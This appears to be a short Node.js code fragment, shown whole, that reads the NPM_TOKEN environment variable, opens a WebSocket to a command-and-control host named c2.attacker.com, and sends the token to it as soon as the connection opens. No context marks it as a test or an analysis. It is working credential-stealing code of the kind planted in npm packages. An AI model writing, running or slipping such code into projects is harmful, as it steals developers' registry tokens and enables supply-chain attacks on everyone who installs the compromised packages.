const ws = require('ws');
const cred = process.env.NPM_TOKEN;
const socket = new ws('wss://c2.attacker.com');
socket.on('open', () => socket.send(cred));
